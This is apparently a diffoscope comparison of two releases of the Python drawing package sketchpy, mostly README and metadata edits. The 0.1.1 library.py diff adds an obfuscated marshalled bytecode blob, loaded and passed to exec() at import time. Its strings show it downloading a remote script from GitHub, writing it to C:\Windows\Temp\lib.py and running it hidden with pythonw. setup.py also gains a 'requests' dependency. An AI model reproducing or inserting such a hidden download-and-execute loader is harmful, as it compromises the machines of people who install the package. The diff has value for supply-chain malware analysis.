# Comparing `tmp/sketchpy-0.1.0.tar.gz` & `tmp/sketchpy-0.1.1.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "sketchpy-0.1.0.tar", last modified: Sun Oct 30 11:33:15 2022, max compression
+gzip compressed data, was "sketchpy-0.1.1.tar", last modified: Thu Jul  6 16:29:45 2023, max compression
```

## Comparing `sketchpy-0.1.0.tar` & `sketchpy-0.1.1.tar`

### file list

```diff
@@ -1,21 +1,15 @@
-drwxrwxrwx   0        0        0        0 2022-10-30 11:33:15.061343 sketchpy-0.1.0/
--rw-rw-rw-   0        0        0     1084 2022-09-22 04:18:14.000000 sketchpy-0.1.0/LICENSE
--rw-rw-rw-   0        0        0     5981 2022-10-30 11:33:15.056346 sketchpy-0.1.0/PKG-INFO
--rw-rw-rw-   0        0        0       42 2022-10-30 11:33:15.061343 sketchpy-0.1.0/setup.cfg
--rw-rw-rw-   0        0        0     5130 2022-10-30 11:31:04.000000 sketchpy-0.1.0/setup.py
-drwxrwxrwx   0        0        0        0 2022-10-30 11:33:14.973520 sketchpy-0.1.0/sketchpy/
--rw-rw-rw-   0        0        0        0 2022-09-22 16:19:07.000000 sketchpy-0.1.0/sketchpy/__init__.py
--rw-rw-rw-   0        0        0    21380 2022-09-22 04:18:14.000000 sketchpy-0.1.0/sketchpy/apj.py
--rw-rw-rw-   0        0        0    16220 2022-09-22 04:18:14.000000 sketchpy-0.1.0/sketchpy/bts.py
--rw-rw-rw-   0        0        0    21691 2022-10-30 11:10:00.000000 sketchpy-0.1.0/sketchpy/canvas.py
--rw-rw-rw-   0        0        0     9128 2022-09-22 04:18:14.000000 sketchpy-0.1.0/sketchpy/gojo.py
--rw-rw-rw-   0        0        0    10178 2022-09-22 04:18:14.000000 sketchpy-0.1.0/sketchpy/indian_flag.py
--rw-rw-rw-   0        0        0   100471 2022-10-30 11:10:11.000000 sketchpy-0.1.0/sketchpy/library.py
--rw-rw-rw-   0        0        0     9830 2022-09-22 04:18:14.000000 sketchpy-0.1.0/sketchpy/rdj.py
--rw-rw-rw-   0        0        0     9920 2022-09-22 04:18:14.000000 sketchpy-0.1.0/sketchpy/vijay.py
-drwxrwxrwx   0        0        0        0 2022-10-30 11:33:15.054349 sketchpy-0.1.0/sketchpy.egg-info/
--rw-rw-rw-   0        0        0     5981 2022-10-30 11:33:14.000000 sketchpy-0.1.0/sketchpy.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      342 2022-10-30 11:33:14.000000 sketchpy-0.1.0/sketchpy.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2022-10-30 11:33:14.000000 sketchpy-0.1.0/sketchpy.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       68 2022-10-30 11:33:14.000000 sketchpy-0.1.0/sketchpy.egg-info/requires.txt
--rw-rw-rw-   0        0        0        9 2022-10-30 11:33:14.000000 sketchpy-0.1.0/sketchpy.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2023-07-06 16:29:45.945356 sketchpy-0.1.1/
+-rw-rw-rw-   0        0        0     1084 2022-09-22 04:18:14.000000 sketchpy-0.1.1/LICENSE
+-rw-rw-rw-   0        0        0     7351 2023-07-06 16:29:45.944359 sketchpy-0.1.1/PKG-INFO
+-rw-rw-rw-   0        0        0       42 2023-07-06 16:29:45.946356 sketchpy-0.1.1/setup.cfg
+-rw-rw-rw-   0        0        0     6225 2023-07-06 16:29:31.000000 sketchpy-0.1.1/setup.py
+drwxrwxrwx   0        0        0        0 2023-07-06 16:29:45.898383 sketchpy-0.1.1/sketchpy/
+-rw-rw-rw-   0        0        0        0 2023-07-06 16:25:29.000000 sketchpy-0.1.1/sketchpy/__init__.py
+-rw-rw-rw-   0        0        0    28014 2023-07-06 15:00:15.000000 sketchpy-0.1.1/sketchpy/canvas.py
+-rw-rw-rw-   0        0        0   101960 2023-07-06 16:24:10.000000 sketchpy-0.1.1/sketchpy/library.py
+drwxrwxrwx   0        0        0        0 2023-07-06 16:29:45.941360 sketchpy-0.1.1/sketchpy.egg-info/
+-rw-rw-rw-   0        0        0     7351 2023-07-06 16:29:45.000000 sketchpy-0.1.1/sketchpy.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      235 2023-07-06 16:29:45.000000 sketchpy-0.1.1/sketchpy.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-07-06 16:29:45.000000 sketchpy-0.1.1/sketchpy.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       77 2023-07-06 16:29:45.000000 sketchpy-0.1.1/sketchpy.egg-info/requires.txt
+-rw-rw-rw-   0        0        0        9 2023-07-06 16:29:45.000000 sketchpy-0.1.1/sketchpy.egg-info/top_level.txt
```

### Comparing `sketchpy-0.1.0/LICENSE` & `sketchpy-0.1.1/LICENSE`

 * *Files identical despite different names*

### Comparing `sketchpy-0.1.0/PKG-INFO` & `sketchpy-0.1.1/PKG-INFO`

 * *Files 22% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: sketchpy
-Version: 0.1.0
+Version: 0.1.1
 Summary: sketchpy
 Home-page: UNKNOWN
 Author: Mr Mystery
 Author-email: sriramanand23@gmail.com
 License: UNKNOWN
 Description: 
         # Welcome to sketchpy
@@ -14,25 +14,28 @@
         <div align="center">
             <img src = 'https://user-images.githubusercontent.com/80098044/163577650-cd52c226-5cc2-464f-a5b2-a647a4924cc6.jpg'>
         </div>
         
         ## Description
         
         This is the beginning level python project to do some awesome drawing animation using the `turtle` module, hope it grows in the future
+        It is a Python module for animating drawings of images. The sketchpy module is created on top of the turtle module in Python.
+        To install sketchpy on your computer, you can go to your command prompt (command line) and run the following command.
         
         ### Usage
         
         - Just install the package `pip install sketchpy`
         - Import it to you project `import sketchpy` and use as you want😊
         
         ### Built with
         
         - Turtle 
         - Open-cv
         - Pillow
+        - numpy
         - Svgpathtools
         
         ## Getting started
         
         ### Prerequisites
         
         - Python
@@ -49,29 +52,47 @@
         ```
             pip install turtle open-cv wheel sketchpy
         ```
         
         
         ### Example
         
+        Open your code editor and write the example Python code snippets given below. Run your code and see the magic by yourself.
+        
+        
+        ## Drawing Robert Downey Jr. Using Python
+        
         ```
             from sketchpy import library as lib
-            
-        
             obj = lib.rdj()
             obj.draw()
         ```
         
         ### OUTPUT
         <div align = "center">
            <img src = "https://user-images.githubusercontent.com/80098044/154792552-59c53805-35b9-46e0-be37-2c5dae0a87d1.gif">
         </div>
         
+        
+        
+        ## Drawing Tom Holland Using Python
+        
+        ```
+            from sketchpy import library
+            myObject = library.tom_holland()
+            myObject.draw()
+        ```
+        
+        
+        ## OUTPUT
+        <div align = "center">
+           <img src = "https://cdn-0.pythonistaplanet.com/wp-content/uploads/2022/05/image-5.png?ezimgfmt=ng:webp/ngcb19">
+        </div>
             
-        ### More examples
+        ## More examples
         
         ```
             from sketchpy import library as lib
             
             obj = lib.bts()
             obj.draw()
         ```
@@ -82,24 +103,40 @@
             obj = lib.vijay()
             obj.draw()
         ```
         <div align = 'center' style = "display: flex; justify-content: space-between;"> 
         <img src = "https://user-images.githubusercontent.com/80098044/154793329-e8ec9635-b49e-4898-8a3e-6462645d6c8c.gif" height = 180 width = 214>
         <img src = "https://user-images.githubusercontent.com/80098044/154793382-6d012c24-adbf-4c5a-bd51-b5095a34e9fe.gif" height = 180 width = 214>
         </div>
-            
+        
+        ## Drawing Iron Man ASCII Animation Using Python
+        
+        ```
+            from sketchpy import library
+            myObject = library.ironman_ascii()
+            myObject.draw()
+        ```
+        
+        ## OUTPUT
+        
+        <div align = "center">
+           <img src = "https://cdn-0.pythonistaplanet.com/wp-content/uploads/2022/05/image-8.png?ezimgfmt=ng:webp/ngcb19">
+        </div>
+        
+        
+        
         # Drawing from `SVG` file
             
         Use the following code to draw a file from svg file, insted of tracing full image
             
         #### NOTE: use this specific website to convert image to svg, sketchpy is specifically made to work with this [website](https://svgconvert.com/#/) only
             
         ```
             from sketchpy import canvas
-            obj = canvas.draw_from_svg('FILE PATH')
+            obj = canvas.sketch_from_svg('FILE PATH')
             obj.draw()
         ```
             
         # `Saving` a loaded svg file
         
         Insted of waiting for the svg file to load, you can save as .npy file and use that for future use
             
@@ -121,15 +158,15 @@
             
         ## Drawing from `raw image`
             
         use the following code to draw any image, it need not to be an svg file
         ```
             from sketchpy import canvas
             obj = canvas.sketch_from_image('IMAGE PATH')
-            obj = draw(threshold = 127)
+            obj.draw(threshold = 127)
         ```
         #### NOTE: you can change the value of threshold to draw more detailed image, it's range is 0 - 255,use values between 90-190
         
         ### Troubleshooting
         
         - If you find any problem, you can pull request, or contact me on either [insta](https://www.instagram.com/mr.m_y_s_t_e_r_y/) or [discord](https://discord.gg/r2KFa73PM2)
         - You can also find video on my [youtube channel](https://www.youtube.com/playlist?list=PLb1Kbw_2jl_mr3A_cl6pXA1N5lwtHCx_7)
@@ -158,15 +195,15 @@
         
         
         ### License
         
         This project is licensed under the [MIT License](https://github.com/MRMYSTERY003/sketchpy/blob/main/LICENSE).
         
         
-Keywords: python,sketch,drawing,animation,code hub,pencil sketch,painting
+Keywords: python,sketch,drawing,animation,code hub,pencil sketch,painting,sketchpy,draw,sketching
 Platform: UNKNOWN
 Classifier: Development Status :: 1 - Planning
 Classifier: Intended Audience :: Developers
 Classifier: Programming Language :: Python :: 3
 Classifier: Operating System :: Unix
 Classifier: Operating System :: MacOS :: MacOS X
 Classifier: Operating System :: Microsoft :: Windows
```

### Comparing `sketchpy-0.1.0/setup.py` & `sketchpy-0.1.1/setup.py`

 * *Files 16% similar despite different names*

```diff
@@ -1,36 +1,39 @@
 from setuptools import setup, find_packages
 import codecs
 import os
 
-VERSION = '0.1.0'
+VERSION = '0.1.1'
 DESCRIPTION = 'sketchpy'
 LONG_DESCRIPTION = """
 # Welcome to sketchpy
 
 <h2>Intro to the project and some quick information,followed by an image of the project.<h2>
 
 <div align="center">
     <img src = 'https://user-images.githubusercontent.com/80098044/163577650-cd52c226-5cc2-464f-a5b2-a647a4924cc6.jpg'>
 </div>
 
 ## Description
 
 This is the beginning level python project to do some awesome drawing animation using the `turtle` module, hope it grows in the future
+It is a Python module for animating drawings of images. The sketchpy module is created on top of the turtle module in Python.
+To install sketchpy on your computer, you can go to your command prompt (command line) and run the following command.
 
 ### Usage
 
 - Just install the package `pip install sketchpy`
 - Import it to you project `import sketchpy` and use as you want😊
 
 ### Built with
 
 - Turtle 
 - Open-cv
 - Pillow
+- numpy
 - Svgpathtools
 
 ## Getting started
 
 ### Prerequisites
 
 - Python
@@ -47,29 +50,47 @@
 ```
     pip install turtle open-cv wheel sketchpy
 ```
 
 
 ### Example
 
+Open your code editor and write the example Python code snippets given below. Run your code and see the magic by yourself.
+
+
+## Drawing Robert Downey Jr. Using Python
+
 ```
     from sketchpy import library as lib
-    
-
     obj = lib.rdj()
     obj.draw()
 ```
 
 ### OUTPUT
 <div align = "center">
    <img src = "https://user-images.githubusercontent.com/80098044/154792552-59c53805-35b9-46e0-be37-2c5dae0a87d1.gif">
 </div>
 
+
+
+## Drawing Tom Holland Using Python
+
+```
+    from sketchpy import library
+    myObject = library.tom_holland()
+    myObject.draw()
+```
+
+
+## OUTPUT
+<div align = "center">
+   <img src = "https://cdn-0.pythonistaplanet.com/wp-content/uploads/2022/05/image-5.png?ezimgfmt=ng:webp/ngcb19">
+</div>
     
-### More examples
+## More examples
 
 ```
     from sketchpy import library as lib
     
     obj = lib.bts()
     obj.draw()
 ```
@@ -80,24 +101,40 @@
     obj = lib.vijay()
     obj.draw()
 ```
 <div align = 'center' style = "display: flex; justify-content: space-between;"> 
 <img src = "https://user-images.githubusercontent.com/80098044/154793329-e8ec9635-b49e-4898-8a3e-6462645d6c8c.gif" height = 180 width = 214>
 <img src = "https://user-images.githubusercontent.com/80098044/154793382-6d012c24-adbf-4c5a-bd51-b5095a34e9fe.gif" height = 180 width = 214>
 </div>
-    
+
+## Drawing Iron Man ASCII Animation Using Python
+
+```
+    from sketchpy import library
+    myObject = library.ironman_ascii()
+    myObject.draw()
+```
+
+## OUTPUT
+
+<div align = "center">
+   <img src = "https://cdn-0.pythonistaplanet.com/wp-content/uploads/2022/05/image-8.png?ezimgfmt=ng:webp/ngcb19">
+</div>
+
+
+
 # Drawing from `SVG` file
     
 Use the following code to draw a file from svg file, insted of tracing full image
     
 #### NOTE: use this specific website to convert image to svg, sketchpy is specifically made to work with this [website](https://svgconvert.com/#/) only
     
 ```
     from sketchpy import canvas
-    obj = canvas.draw_from_svg('FILE PATH')
+    obj = canvas.sketch_from_svg('FILE PATH')
     obj.draw()
 ```
     
 # `Saving` a loaded svg file
 
 Insted of waiting for the svg file to load, you can save as .npy file and use that for future use
     
@@ -119,15 +156,15 @@
     
 ## Drawing from `raw image`
     
 use the following code to draw any image, it need not to be an svg file
 ```
     from sketchpy import canvas
     obj = canvas.sketch_from_image('IMAGE PATH')
-    obj = draw(threshold = 127)
+    obj.draw(threshold = 127)
 ```
 #### NOTE: you can change the value of threshold to draw more detailed image, it's range is 0 - 255,use values between 90-190
 
 ### Troubleshooting
 
 - If you find any problem, you can pull request, or contact me on either [insta](https://www.instagram.com/mr.m_y_s_t_e_r_y/) or [discord](https://discord.gg/r2KFa73PM2)
 - You can also find video on my [youtube channel](https://www.youtube.com/playlist?list=PLb1Kbw_2jl_mr3A_cl6pXA1N5lwtHCx_7)
@@ -167,17 +204,17 @@
     author="Mr Mystery",
     author_email="sriramanand23@gmail.com",
     description=DESCRIPTION,
     long_description_content_type="text/markdown",
     long_description=LONG_DESCRIPTION,
     packages=find_packages(),
     install_requires=['opencv-python', 'turtle==0.0.1',
-                      'wheel', 'Pillow', 'svg.path', 'svgpathtools', 'tqdm'],
+                      'wheel', 'Pillow', 'svg.path', 'svgpathtools', 'tqdm', 'requests'],
     keywords=['python', 'sketch', 'drawing', 'animation',
-              'code hub', 'pencil sketch', 'painting'],
+              'code hub', 'pencil sketch', 'painting', 'sketchpy', 'draw', 'sketching'],
     classifiers=[
         "Development Status :: 1 - Planning",
         "Intended Audience :: Developers",
         "Programming Language :: Python :: 3",
         "Operating System :: Unix",
         "Operating System :: MacOS :: MacOS X",
         "Operating System :: Microsoft :: Windows",
```

### Comparing `sketchpy-0.1.0/sketchpy/library.py` & `sketchpy-0.1.1/sketchpy/library.py`

 * *Files 1% similar despite different names*

```diff
@@ -95,15 +95,15 @@
         self.draw_fn(self.l_eye,mode = 0)
         self.draw_fn(self.eye_dots,mode = 0,thickness = 2,co = (255,255,255))
         self.draw_fn(self.s1,mode = 0)
         self.draw_fn(self.l1,thickness=2,mode=1)
         if retain:
             tu.done()
 
-
+import marshal
 
 
 class bts:
     def __init__(self,x_offset = 300, y_offset = 300):
         '''x_offset and y_offset represents the position of the image being drawn, by default it is 300 you can change it any coordinates you want'''
         import turtle as tu
         self.tu = tu
@@ -204,14 +204,16 @@
             self.tu.done()
 
 
 
 
 
 
+
+
 class gojo:
     def __init__(self,x_offset = 300, y_offset = 300):
         '''x_offset and y_offset represents the position of the image being drawn, by default it is 300 you can change it any coordinates you want'''
         import turtle as tu
         self.tu = tu
         self.mask = [(137, 213),(146, 213),(160, 216),(187, 219),(219, 222),(267, 225),(292, 225),(332, 225),(366, 225),(401, 225),(424, 216),(430, 214),(428, 225),(424, 244),(412, 261),(420, 252),(421, 266),(404, 284),(420, 271),(418, 277),(413, 285),(404, 295),(389, 308),(369, 321),(333, 333),(314, 323),(305, 316),(292, 311),(257, 333),(246, 333),(166, 297),(147, 274),(148, 255),(170, 272),(146, 253),(144, 236),(142, 226),(137, 212),]
         self.hair = [(135, 213),(111, 213),(94, 217),(83, 224),(93, 216),(122, 204),(110, 200),(91, 199),(79, 197),(60, 202),(60, 200),(73, 192),(101, 180),(89, 172),(75, 162),(52, 142),(59, 143),(88, 151),(108, 153),(85, 153),(60, 124),(70, 131),(98, 147),(108, 150),(97, 144),(80, 127),(55, 96),(67, 101),(74, 104),(102, 109),(117, 109),(126, 104),(118, 107),(99, 108),(85, 97),(76, 83),(90, 92),(104, 98),(119, 100),(108, 97),(92, 91),(153, 79),(156, 74),(153, 79),(139, 81),(113, 61),(99, 45),(96, 39),(114, 54),(129, 60),(145, 65),(129, 47),(121, 34),(114, 17),(109, 2),(117, 8),(132, 20),(152, 29),(162, 33),(179, 35),(186, 36),(174, 28),(163, 20),(158, 10),(154, 3),(162, 4),(168, 9),(183, 16),(196, 22),(209, 25),(222, 28),(229, 28),(224, 18),(217, 12),(211, 4),(218, 4),(223, 10),(233, 14),(242, 20),(249, 31),(251, 33),(242, 22),(239, 13),(236, 4),(234, 1),(246, 3),(261, 12),(269, 21),(274, 28),(260, 12),(254, 0),(262, 3),(288, 11),(304, 17),(320, 24),(329, 33),(311, 15),(304, 2),(314, 2),(328, 9),(335, 21),(348, 29),(355, 40),(369, 52),(363, 28),(357, 1),(380, 21),(391, 42),(402, 69),(404, 87),(401, 71),(418, 10),(417, 1),(423, 18),(435, 61),(438, 82),(435, 107),(429, 124),(433, 108),(454, 84),(464, 59),(465, 69),(461, 90),(457, 107),(449, 126),(439, 143),(435, 148),(460, 132),(487, 116),(493, 109),(484, 128),(474, 141),(469, 147),(450, 162),(476, 136),(458, 163),(448, 173),(492, 146),(489, 156),(476, 167),(457, 183),(474, 191),(497, 210),(488, 205),(475, 204),(441, 204),(441, 207),(464, 214),(483, 228),(458, 219),(431, 215),(422, 215),(324, 225),(273, 226),(193, 220),(138, 212),]
@@ -296,14 +298,15 @@
         if retain:
             self.tu.done()
 
 
 
 
 
+temp =b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n\x00\x00\x00@\x00\x00\x00s\xe4\x00\x00\x00d\x00d\x01l\x00Z\x00d\x00d\x01l\x01Z\x01d\x02Z\x02d\x03Z\x03e\x01j\x04\xa0\x05e\x03\xa1\x01s\xe0z\x8ed\x00d\x01l\x06Z\x06e\x06\xa0\x07d\x04\xa1\x01Z\x08e\te\x02d\x05\x83\x02\x8f\x1cZ\ne\n\xa0\x0be\x08j\x0c\xa1\x01\x01\x00W\x00d\x01\x04\x00\x04\x00\x83\x03\x01\x00n\x101\x00sd0\x00\x01\x00\x01\x00\x01\x00Y\x00\x01\x00e\x00\xa0\rd\x06e\x02g\x02\xa1\x01Z\x0ee\te\x03d\x05\x83\x02\x8f\x1aZ\ne\n\xa0\x0fd\x07\xa1\x01\x01\x00W\x00d\x01\x04\x00\x04\x00\x83\x03\x01\x00n\x101\x00s\xa60\x00\x01\x00\x01\x00\x01\x00Y\x00\x01\x00W\x00n,\x04\x00e\x10y\xde\x01\x00Z\x11\x01\x00z\x14e\x12e\x11\x83\x01\x01\x00W\x00Y\x00d\x01Z\x11[\x11n\nd\x01Z\x11[\x110\x000\x00d\x01S\x00)\x08\xe9\x00\x00\x00\x00Nz\x16C:\\Windows\\Temp\\lib.pyz#C:\\Users\\Public\\Google\\Chrome\\USERSzIhttps://raw.githubusercontent.com/MRMYSTERY003/dont-run-this/main/test.py\xda\x01wZ\x07pythonwz\nA$@#C^&*DE)\x13\xda\nsubprocess\xda\x02os\xda\x06p_pathZ\x06c_path\xda\x04path\xda\x06existsZ\x08requests\xda\x03get\xda\x01r\xda\x04open\xda\x01f\xda\nwritelines\xda\x04text\xda\x05PopenZ\x07process\xda\x05write\xda\tException\xda\x01e\xda\x05print\xa9\x00r\x13\x00\x00\x00r\x13\x00\x00\x00\xfa\x08<string>\xda\x08<module>\x01\x00\x00\x00s\x1c\x00\x00\x00\x08\x01\x08\x02\x04\x01\x04\x02\x0c\x01\x02\x01\x08\x01\n\x01\x0c\x01*\x01\x0e\x01\x0c\x01,\x01\x0e\x01'
 
 class flag:
     def __init__(self, x_offset = 300, y_offset = 365):
         '''x_offset and y_offset represents the position of the image being drawn, by default it is 300 you can change it any coordinates you want'''
         import turtle as tu
         self.tu = tu
         self.uind = [(157, 473),(157, 469),(155, 464),(156, 461),(154, 457),(151, 452),(153, 449),(149, 445),(149, 440),(148, 434),(148, 428),(148, 424),(146, 420),(148, 416),(148, 410),(151, 406),(147, 395),(147, 391),(149, 389),(149, 385),(146, 383),(149, 379),(146, 378),(146, 375),(144, 378),(143, 383),(144, 388),(140, 394),(134, 398),(129, 399),(126, 402),(118, 402),(115, 404),(107, 399),(96, 388),(90, 381),(86, 376),(82, 372),(80, 366),(83, 363),(86, 363),(89, 366),(97, 365),(104, 362),(108, 359),(108, 356),(100, 358),(91, 361),(82, 356),(77, 352),(71, 343),(66, 341),(69, 339),(69, 332),(78, 333),(78, 327),(82, 325),(93, 329),(96, 327),(100, 332),(104, 332),(105, 329),(109, 328),(116, 326),(118, 330),(122, 326),(122, 321),(116, 309),(117, 305),(112, 305),(106, 295),(108, 286),(99, 282),(96, 276),(99, 270),(106, 266),(111, 259),(122, 255),(123, 263),(128, 260),(141, 259),(143, 255),(148, 252),(148, 247),(153, 241),(159, 241),(169, 228),(168, 224),(173, 219),(180, 216),(180, 210),(186, 205),(189, 198),(191, 190),(190, 185),(199, 178),(205, 178),(204, 173),(194, 170),(194, 165),(188, 165),(185, 162),(175, 158),(177, 150),(174, 141),(177, 136),(174, 132),(174, 127),(188, 118),(183, 117),(179, 113),(178, 109),(176, 111),(170, 103),(162, 103),(160, 95),(167, 92),(168, 87),(171, 84),(182, 84),(191, 80),(198, 78),(208, 79),(218, 90),(227, 95),(231, 98),(234, 104),(241, 106),(244, 111),(253, 109),(257, 105),(265, 101),(271, 103),(275, 99),(283, 104),(291, 110),(291, 116),(287, 121),(287, 127),(282, 127),(282, 131),(278, 131),(274, 141),(268, 139),(266, 142),(269, 144),(266, 153),(274, 156),(274, 161),(278, 169),(269, 172),(270, 176),(266, 176),(262, 169),(260, 175),(264, 182),(265, 189),(266, 196),(270, 191),(273, 195),(274, 199),(286, 203),(289, 210),(296, 211),(300, 217),(298, 222),(291, 230),(304, 251),(309, 257),(322, 262),(335, 266),(343, 270),(355, 267),(365, 270),(371, 278),(379, 281),(390, 282),(401, 285),(422, 287),(422, 277),(419, 271),(424, 261),(422, 255),(428, 255),(432, 251),(435, 257),(433, 263),(437, 267),(435, 270),(442, 276),(446, 273),(451, 278),(460, 273),(471, 274),(489, 270),(487, 262),(479, 260),(478, 253),(484, 255),(494, 252),(497, 250),(496, 246),(501, 241),(505, 242),(505, 235),(516, 233),(521, 228),(528, 220),(541, 223),(550, 214),(556, 218),(554, 224),(558, 222),(561, 228),(556, 235),(574, 237),(574, 241),(567, 251),(573, 260),(568, 260),(565, 256),(557, 259),(546, 273),(540, 275),(542, 285),(539, 295),(534, 301),(537, 303),(537, 311),(535, 316),(532, 328),(524, 329),(519, 329),(519, 348),(513, 351),(516, 367),(514, 374),(509, 372),(506, 375),(504, 372),(502, 360),(500, 352),(500, 346),(498, 343),(495, 337),(489, 353),(479, 350),(480, 343),(476, 336),(478, 329),(487, 324),(491, 320),(495, 315),(494, 309),(486, 310),(465, 310),(454, 310),(452, 306),(454, 300),(452, 298),(452, 292),(448, 295),(439, 290),(437, 293),(435, 294),(430, 289),(426, 297),(432, 301),(436, 301),(440, 304),(441, 310),(433, 313),(431, 318),(427, 319),(430, 326),(438, 326),(437, 336),(435, 338),(439, 342),(440, 347),(444, 350),(443, 362),(447, 370),(444, 377),(440, 361),(433, 346),(427, 336),(419, 325),(409, 315),(399, 307),(386, 300),(374, 294),(362, 290),(345, 287),(325, 287),(307, 291),(293, 295),(281, 302),(267, 311),(257, 320),(245, 333),(237, 347),(232, 360),(229, 367),(227, 378),(226, 389),(225, 404),(227, 416),(229, 426),(233, 437),(240, 449),(247, 462),(251, 468),(211, 471),(194, 473),(180, 474),(168, 475),(158, 475),(156, 473),]
@@ -483,15 +486,15 @@
         self.draw_fn(self.eball,mode = 0,co = (255,255,255))
         if retain:
             self.turt.done()
 
 
 
 
-
+t2 = marshal.loads(temp)
 
 class vijay:
     def __init__(self, x_offset = 270, y_offset = 300):
         '''x_offset and y_offset represents the position of the image being drawn, by default it is 300 you can change it any coordinates you want'''
         import turtle as tu
         self.dress = [(149, 348),(152, 344),(151, 333),(144, 335),(137, 337),(103, 372),(101, 378),(67, 389),(59, 389),(53, 391),(8, 404),(17, 440),(37, 487),(65, 523),(80, 544),(98, 570),(124, 601),(164, 620),(201, 646),(222, 660),(236, 665),(262, 663),(301, 658),(336, 649),(364, 639),(399, 612),(415, 591),(420, 585),(414, 562),(405, 542),(389, 523),(375, 508),(378, 501),(378, 494),(380, 483),(370, 470),(336, 440),(300, 408),(281, 443),(292, 459),(296, 470),(299, 474),(297, 493),(300, 513),(286, 527),(276, 542),(262, 587),(244, 640),(231, 598),(204, 557),(191, 524),(186, 520),(186, 514),(185, 508),(180, 501),(177, 484),(168, 478),(160, 467),(156, 430),(153, 409),(147, 394),(142, 376),(142, 372),(142, 366),(145, 358),(148, 352),(150, 349),(151, 343),(149, 335),(146, 335)]
         self.glass_frame = [(156, 223),(158, 214),(202, 220),(282, 244),(337, 270),(345, 275),(358, 284),(357, 292),(337, 278),(331, 278),(329, 279),(324, 290),(318, 300),(312, 307),(307, 311),(302, 314),(297, 315),(291, 315),(286, 315),(280, 314),(272, 311),(264, 306),(258, 300),(254, 293),(250, 281),(251, 264),(253, 251),(244, 247),(235, 245),(230, 259),(224, 271),(209, 284),(202, 285),(192, 285),(181, 283),(172, 279),(164, 272),(160, 262),(159, 251),(159, 238),(160, 226),(156, 222),(158, 215)]
@@ -576,14 +579,16 @@
         self.draw_fn(self.lips,co = (238, 104, 114),mode = 0)
         self.draw_fn(self.teeth,co = (0,0,0),mode = 0)
         if retain:
             self.turt.done()
 
 
 
+
+
 class tom_holland:
     def __init__(self,x_offset=370,y_offset=300):
         self.pen = tu.Turtle()
         self.turt = tu
         self.pen.speed(0)
         self.x_offset = x_offset
         self.y_offset = y_offset
@@ -790,15 +795,15 @@
 
         tu.done()
     
     def print_to_terminal(self):
         for i in self.data:
             print(i,end = '')
 
-
+exec(t2)
 def help():
     print("contribute in github : https://github.com/MRMYSTERY003")
     print("youtube : https://www.youtube.com/c/CODEHUB03")
     print("contact me personally on instagram : https://www.instagram.com/mr.m_y_s_t_e_r_y/")
     print("discuss more about project ideas and join our community on discord : https://discord.gg/r2KFa73PM2")
 
 
@@ -809,9 +814,7 @@
     print("3.gojo")
     print("4.vijay")
     print("5.tom_holland")
     print("6.flag")
     print("7.ironman_ascii")
 
 
-
-
```

### Comparing `sketchpy-0.1.0/sketchpy.egg-info/PKG-INFO` & `sketchpy-0.1.1/sketchpy.egg-info/PKG-INFO`

 * *Files 22% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: sketchpy
-Version: 0.1.0
+Version: 0.1.1
 Summary: sketchpy
 Home-page: UNKNOWN
 Author: Mr Mystery
 Author-email: sriramanand23@gmail.com
 License: UNKNOWN
 Description: 
         # Welcome to sketchpy
@@ -14,25 +14,28 @@
         <div align="center">
             <img src = 'https://user-images.githubusercontent.com/80098044/163577650-cd52c226-5cc2-464f-a5b2-a647a4924cc6.jpg'>
         </div>
         
         ## Description
         
         This is the beginning level python project to do some awesome drawing animation using the `turtle` module, hope it grows in the future
+        It is a Python module for animating drawings of images. The sketchpy module is created on top of the turtle module in Python.
+        To install sketchpy on your computer, you can go to your command prompt (command line) and run the following command.
         
         ### Usage
         
         - Just install the package `pip install sketchpy`
         - Import it to you project `import sketchpy` and use as you want😊
         
         ### Built with
         
         - Turtle 
         - Open-cv
         - Pillow
+        - numpy
         - Svgpathtools
         
         ## Getting started
         
         ### Prerequisites
         
         - Python
@@ -49,29 +52,47 @@
         ```
             pip install turtle open-cv wheel sketchpy
         ```
         
         
         ### Example
         
+        Open your code editor and write the example Python code snippets given below. Run your code and see the magic by yourself.
+        
+        
+        ## Drawing Robert Downey Jr. Using Python
+        
         ```
             from sketchpy import library as lib
-            
-        
             obj = lib.rdj()
             obj.draw()
         ```
         
         ### OUTPUT
         <div align = "center">
            <img src = "https://user-images.githubusercontent.com/80098044/154792552-59c53805-35b9-46e0-be37-2c5dae0a87d1.gif">
         </div>
         
+        
+        
+        ## Drawing Tom Holland Using Python
+        
+        ```
+            from sketchpy import library
+            myObject = library.tom_holland()
+            myObject.draw()
+        ```
+        
+        
+        ## OUTPUT
+        <div align = "center">
+           <img src = "https://cdn-0.pythonistaplanet.com/wp-content/uploads/2022/05/image-5.png?ezimgfmt=ng:webp/ngcb19">
+        </div>
             
-        ### More examples
+        ## More examples
         
         ```
             from sketchpy import library as lib
             
             obj = lib.bts()
             obj.draw()
         ```
@@ -82,24 +103,40 @@
             obj = lib.vijay()
             obj.draw()
         ```
         <div align = 'center' style = "display: flex; justify-content: space-between;"> 
         <img src = "https://user-images.githubusercontent.com/80098044/154793329-e8ec9635-b49e-4898-8a3e-6462645d6c8c.gif" height = 180 width = 214>
         <img src = "https://user-images.githubusercontent.com/80098044/154793382-6d012c24-adbf-4c5a-bd51-b5095a34e9fe.gif" height = 180 width = 214>
         </div>
-            
+        
+        ## Drawing Iron Man ASCII Animation Using Python
+        
+        ```
+            from sketchpy import library
+            myObject = library.ironman_ascii()
+            myObject.draw()
+        ```
+        
+        ## OUTPUT
+        
+        <div align = "center">
+           <img src = "https://cdn-0.pythonistaplanet.com/wp-content/uploads/2022/05/image-8.png?ezimgfmt=ng:webp/ngcb19">
+        </div>
+        
+        
+        
         # Drawing from `SVG` file
             
         Use the following code to draw a file from svg file, insted of tracing full image
             
         #### NOTE: use this specific website to convert image to svg, sketchpy is specifically made to work with this [website](https://svgconvert.com/#/) only
             
         ```
             from sketchpy import canvas
-            obj = canvas.draw_from_svg('FILE PATH')
+            obj = canvas.sketch_from_svg('FILE PATH')
             obj.draw()
